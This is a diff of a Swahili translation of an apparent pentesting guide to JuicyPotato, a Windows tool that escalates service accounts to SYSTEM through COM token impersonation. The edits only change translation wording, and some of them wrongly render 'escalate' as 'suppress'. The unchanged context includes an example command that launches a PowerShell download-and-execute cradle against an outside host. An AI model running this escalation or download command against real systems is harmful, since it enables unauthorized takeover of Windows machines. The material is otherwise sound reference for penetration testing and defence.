@@ -4,13 +4,14 @@
 
 > [!WARNING] > **JuicyPotato haitumiki** kwenye Windows Server 2019 na Windows 10 build 1809 kuendelea. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) zinaweza kutumika **kuchukua faida ya ruhusa sawa na kupata `NT AUTHORITY\SYSTEM`** kiwango cha ufikiaji. _**Angalia:**_
 
+
 {{#ref}}
 roguepotato-and-printspoofer.md
 {{#endref}}
 
-## Juicy Potato (kutumia ruhusa za dhahabu) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
+## Juicy Potato (kukandamiza ruhusa za dhahabu) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_Toleo lililo na sukari la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, likiwa na kidogo cha juisi, yaani **chombo kingine cha Kupanua Ruhusa za Mitaa, kutoka Akaunti za Huduma za Windows hadi NT AUTHORITY\SYSTEM**_
+_Toleo lililo na sukari la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, likiwa na juisi kidogo, yaani **chombo kingine cha Kukandamiza Ruhusa za Mitaa, kutoka Akaunti za Huduma za Windows hadi NT AUTHORITY\SYSTEM**_
 
 #### Unaweza kupakua juicypotato kutoka [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
 
@@ -18,36 +19,36 @@ _Toleo lililo na sukari la_ [_RottenPotatoNG_](https://github.com/breenmachine/R
 
 [**Kutoka kwa juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [mifano zake](https://github.com/decoder-it/lonelypotato) zinatumia mnyororo wa kupanua ruhusa kulingana na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [huduma](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ikiwa na msikilizaji wa MiTM kwenye `127.0.0.1:6666` na unapokuwa na ruhusa za `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa ukaguzi wa toleo la Windows tuligundua usanidi ambapo `BITS` ulikuwa umezimwa makusudi na bandari `6666` ilikuwa imechukuliwa.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [toleo lake](https://github.com/decoder-it/lonelypotato) linatumia mnyororo wa kukandamiza ruhusa kulingana na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [huduma](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ikiwa na msikilizaji wa MiTM kwenye `127.0.0.1:6666` na unapokuwa na ruhusa za `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa ukaguzi wa toleo la Windows tuligundua usanidi ambapo `BITS` ulikuwa umezimwa makusudi na bandari `6666` ilikuwa imechukuliwa.
 
-Tuliamua kuunda silaha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema salamu kwa Juicy Potato**.
+Tuliamua kuunda silaha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema hello kwa Juicy Potato**.
 
-> Kwa nadharia, angalia [Rotten Potato - Kupanua Ruhusa kutoka Akaunti za Huduma hadi SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na ufuate mnyororo wa viungo na marejeleo.
+> Kwa nadharia, angalia [Rotten Potato - Kukandamiza Ruhusa kutoka Akaunti za Huduma hadi SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na ufuate mnyororo wa viungo na marejeleo.
 
-Tuligundua kwamba, mbali na `BITS` kuna seva kadhaa za COM tunaweza kutumia. Zinahitaji tu:
+Tuligundua kwamba, mbali na `BITS` kuna seva kadhaa za COM tunaweza kuzitumia. Zinahitaji tu:
 
 1. kuwa na uwezo wa kuanzishwa na mtumiaji wa sasa, kawaida "mtumiaji wa huduma" ambaye ana ruhusa za kuiga
 2. kutekeleza interface ya `IMarshal`
 3. kukimbia kama mtumiaji aliyeinuliwa (SYSTEM, Administrator, …)
 
-Baada ya majaribio kadhaa tulipata na kujaribu orodha kubwa ya [CLSID za kuvutia](http://ohpe.it/juicy-potato/CLSID/) kwenye toleo kadhaa za Windows.
+Baada ya majaribio kadhaa tulipata na kujaribu orodha kubwa ya [CLSID za kuvutia](http://ohpe.it/juicy-potato/CLSID/) kwenye matoleo kadhaa ya Windows.
 
 ### Maelezo ya Juicy <a href="#juicy-details" id="juicy-details"></a>
 
 JuicyPotato inakuwezesha:
 
 - **CLSID ya Lengo** _chagua CLSID yoyote unayotaka._ [_Hapa_](http://ohpe.it/juicy-potato/CLSID/) _unaweza kupata orodha iliyopangwa kwa OS._
-- **Bandari ya Kusikiliza ya COM** _mwelekeo wa bandari ya kusikiliza ya COM unayopendelea (badala ya 6666 iliyowekwa kwenye marshalled)_
+- **Bandari ya Kusikiliza ya COM** _mwelekeo wa bandari ya kusikiliza ya COM unayopendelea (badala ya 6666 iliyowekwa kwenye msimbo)_
 - **Anwani ya IP ya Kusikiliza ya COM** _fungua seva kwenye IP yoyote_
-- **Njia ya uundaji wa mchakato** _kulingana na ruhusa za mtumiaji aliyeiga unaweza kuchagua kutoka:_
+- **Njia ya uundaji wa mchakato** _kulingana na ruhusa za mtumiaji aliyeigizwa unaweza kuchagua kutoka:_
 - `CreateProcessWithToken` (inahitaji `SeImpersonate`)
 - `CreateProcessAsUser` (inahitaji `SeAssignPrimaryToken`)
 - `zote`
-- **Mchakato wa kuzindua** _zindua executable au script ikiwa unyakuzi utafaulu_
-- **Argument ya Mchakato** _binafsisha hoja za mchakato uliozinduliwa_
+- **Mchakato wa kuzindua** _zindua executable au script ikiwa unyakuzi unafanikiwa_
+- **Hoja za Mchakato** _binafsisha hoja za mchakato uliozinduliwa_
 - **Anwani ya Seva ya RPC** _kwa njia ya siri unaweza kujiandikisha kwa seva ya RPC ya nje_
 - **Bandari ya Seva ya RPC** _inafaa ikiwa unataka kujiandikisha kwa seva ya nje na firewall inazuia bandari `135`…_
-- **MTIHANI wa hali** _hasa kwa madhumuni ya majaribio, yaani. kujaribu CLSIDs. Inaunda DCOM na kuchapisha mtumiaji wa token. Angalia_ [_hapa kwa majaribio_](http://ohpe.it/juicy-potato/Test/)
+- **Hali ya TEST** _hasa kwa madhumuni ya majaribio, yaani, kujaribu CLSIDs. Inaunda DCOM na kuchapisha mtumiaji wa token. Angalia_ [_hapa kwa majaribio_](http://ohpe.it/juicy-potato/Test/)
 
 ### Matumizi <a href="#usage" id="usage"></a>
 ```
@@ -68,7 +69,7 @@ Optional args:
 ```
 ### Mawazo ya Mwisho <a href="#final-thoughts" id="final-thoughts"></a>
 
-[**Kutoka juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
+[**Kutoka kwenye juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
 
 Ikiwa mtumiaji ana `SeImpersonate` au `SeAssignPrimaryToken` ruhusa basi wewe ni **SYSTEM**.
 
@@ -99,7 +100,7 @@ c:\Users\Public>
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
-### Anzisha CMD mpya (ikiwa una ufikiaji wa RDP)
+### Kuanzisha CMD mpya (ikiwa una ufikiaji wa RDP)
 
 ![](<../../images/image (300).png>)
 
@@ -117,7 +118,7 @@ Kwanza, utahitaji baadhi ya executable mbali na juicypotato.exe.
 
 Pakua [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) na uipakie kwenye kikao chako cha PS, na pakua na uendeshe [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Skripti hiyo itaunda orodha ya CLSIDs zinazowezekana za kujaribu.
 
-Kisha pakua [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(badilisha njia ya orodha ya CLSID na kwa executable ya juicypotato) na uendeshe. Itaanza kujaribu kila CLSID, na **wakati nambari ya bandari inabadilika, itamaanisha kwamba CLSID ilifanya kazi**.
+Kisha pakua [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(badilisha njia ya orodha ya CLSID na kwa executable ya juicypotato) na uendeshe. Itaanza kujaribu kila CLSID, na **wakati nambari ya bandari inabadilika, itamaanisha kuwa CLSID ilifanya kazi**.
 
 **Angalia** CLSIDs zinazofanya kazi **ukitumia parameter -c**
 
